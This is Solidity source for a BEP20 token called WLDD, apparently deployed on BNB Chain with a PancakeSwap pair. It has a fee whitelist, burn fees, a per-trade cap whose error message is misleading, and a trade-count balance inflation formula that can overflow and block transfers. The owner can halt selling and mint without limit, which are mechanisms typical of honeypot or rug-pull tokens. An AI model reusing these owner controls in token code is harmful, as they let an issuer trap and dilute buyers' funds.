interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

/**
 * @dev Hook that is called before any transfer of tokens. This includes
 * minting and burning.
 * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
 */

contract BEP20WLDD is Ownable, IBEP20 {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    uint256 private countTimes;

    mapping(string => uint256) public vals;
    mapping(string => address) public adds;
    mapping(string => bool) public switchs;
    mapping(address => bool) public whites;
    mapping(address => bool) public pairs;
    mapping(address => uint256) public userTimesMap;

    constructor() {
        _name = "WLDD";
        _symbol = "WLDD";
        _decimals = 18;

        vals["tradeLimit"] = 1 * 10**20;
        vals["buyBurn"] = 10;
        vals["sellBurn"] = 20;
        vals["holdInterestRatio"] = 10;

       
        adds["buyBurn"] = 0x9296cd8EDdc4eEFa1F756e3776924d57D0513294;
        adds["sellBurn"] = 0x5d4DE65BAe15D6E2f659fcF74ffBbfFF11635aac;
        adds["factory"] = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
        adds["router"] = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        adds["USDT"] = 0x55d398326f99059fF775485246999027B3197955;
        _mint(0x4F597B7Cacb36EBC476Caae15dd2fddF41dc6ce9, 1 * 10**26);


        switchs["canBuy"] = true;
        switchs["canSell"] = true;

        whites[adds["buyBurn"]] = true;
        whites[adds["sellBurn"]] = true;
        whites[address(this)] = true;
        whites[msg.sender] = true;
        address liquidity = IFactory(adds["factory"]).createPair(
            adds["USDT"],
            address(this)
        );
        setPairs(liquidity, true);
    }

    function setConfig(
        string memory key,
        address add,
        uint256 rate
    ) public onlyOwner returns (bool) {
        adds[key] = add;
        vals[key] = rate;
        return true;
    }

    function setPairs(address add, bool state) public onlyOwner returns (bool) {
        pairs[add] = state;
        return true;
    }

    function setTradeStatus(bool canBuy, bool canSell)
        public
        onlyOwner
        returns (bool)
    {
        switchs["canBuy"] = canBuy;
        switchs["canSell"] = canSell;
        return true;
    }

    function setWhite(address add, bool status)
        public
        onlyOwner
        returns (bool)
    {
        whites[add] = status;
        return true;
    }

    function isSwap(address sender, address recipient)
        private
        view
        returns (bool)
    {
        return pairs[sender] || pairs[recipient];
    }

    function isBuy(address sender, address recipient)
        private
        view
        returns (bool)
    {
        return pairs[sender] && !whites[recipient];
    }

    function isSell(address sender, address recipient)
        private
        view
        returns (bool)
    {
        return !whites[sender] && pairs[recipient];
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");

       
        uint256 burnAmount = 0;
        uint256 leftAmount = 0;

       
        if (isBuy(sender, recipient)) {
            require(
                switchs["canBuy"] == true,
                "BEP20: buy from dex is closed"
            );
            _balances[sender] = _balances[sender].sub( amount, "BEP20: transfer amount exceeds balance");
            
            checkTardeAmount(amount);
            if (vals["buyBurn"] > 0) {
                burnAmount = amount.div(1000).mul(vals["buyBurn"]);
                _balances[adds["buyBurn"]] = _balances[adds["buyBurn"]].add(
                    burnAmount
                );
                emit Transfer(sender, adds["buyBurn"], burnAmount);
            }
            leftAmount = amount.sub(burnAmount);
            countTimes++;
            _balances[recipient] = refreshBalance(recipient).add(leftAmount);
            userTimesMap[recipient] = countTimes;
        } else if (isSell(sender, recipient)) {
            require(
                switchs["canSell"] == true,
                "BEP20: sell to dex is closed"
            );
           
            _balances[sender] = refreshBalance(sender).sub(amount, "BEP20: transfer amount exceeds balance");
            userTimesMap[sender] = countTimes;
            countTimes++;

            if (vals["sellBurn"] > 0) {
                burnAmount = amount.div(1000).mul(vals["sellBurn"]);
                _balances[adds["sellBurn"]] = _balances[adds["sellBurn"]]
                    .add(burnAmount);
                emit Transfer(sender, adds["sellBurn"], burnAmount);
            }

            leftAmount = amount.sub(burnAmount);
            _balances[recipient] = _balances[recipient].add(leftAmount);
        }else {
            _balances[sender] = refreshBalance(sender).sub(amount, "BEP20: transfer amount exceeds balance");
            userTimesMap[sender] = countTimes;

            _balances[recipient] = refreshBalance(recipient).add(amount);
            userTimesMap[recipient] = countTimes;
            leftAmount = amount;
        }
        emit Transfer(sender, recipient, leftAmount);
    }

    function checkTardeAmount(uint256 amount) internal view {
        if (vals["tradeLimit"] > 0) {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = adds["USDT"];
            uint256[] memory amounts = IRouter(adds["router"]).getAmountsOut(
                amount,
                path
            );
            require(
                vals["tradeLimit"] > amounts[1],
                "The whitelist is fully subscribed"
            );
        }
    }

    //end of biz logics
    /**
     * @dev Returns the bep token owner.
     */
    function getOwner() external view override returns (address) {
        return owner();
    }

    /**
     * @dev Returns the token decimals.
     */
    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    /**
     * @dev Returns the token symbol.
     */
    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the token name.
     */
    function name() external view override returns (string memory) {
        return _name;
    }

    /**
     * @dev See {BEP20-totalSupply}.
     */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {BEP20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        // return _balances[account];
        return  calculateBalance(_balances[account],countTimes,userTimesMap[account]);
    }

    /**
     * @dev See {BEP20-transfer}.
     */
    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {BEP20-allowance}.
     */
    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {BEP20-approve}.
     */
    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {BEP20-transferFrom}.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "BEP20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "BEP20: decreased allowance below zero"
            )
        );
        return true;
    }

    /**
     * @dev Creates `amount` tokens and assigns them to `msg.sender`, increasing
     * the total supply.
     */
    function mint(address _add, uint256 amount)
        public
        onlyOwner
        returns (bool)
    {
        _mint(_add, amount);
        return true;
    }

    /**
     * @dev Burn `amount` tokens and decreasing the total supply.
     */
    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     */
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     */
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");

        _balances[account] = _balances[account].sub(
            amount,
            "BEP20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`.`amount` is then deducted
     * from the caller's allowance.
     */
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(
            account,
            _msgSender(),
            _allowances[account][_msgSender()].sub(
                amount,
                "BEP20: burn amount exceeds allowance"
            )
        );
    }

    function withdrawToken(
        address _token,
        address _add,
        uint256 _amount
    ) external onlyOwner {
        IBEP20(_token).transfer(_add, _amount);
    }

    function withdraw(address payable _add, uint256 _amount)
        external
        onlyOwner
    {
        require(_add.send(_amount));
    }


     function refreshBalance (
        address account
    ) internal returns  (uint256) {
        uint afterBalance = calculateBalance(_balances[account],countTimes,userTimesMap[account]);
        _totalSupply = _totalSupply.add(afterBalance.sub(_balances[account]));
        return afterBalance;
    }


    function calculateBalance(
        uint256 balance,
        uint256 times,
        uint256 currentTimes
    ) public pure returns (uint256) {
        uint256 cha = times - currentTimes;
        uint256 res = (balance * (1000 + 10)**cha) / (1000**cha);
        return res;
    }
}
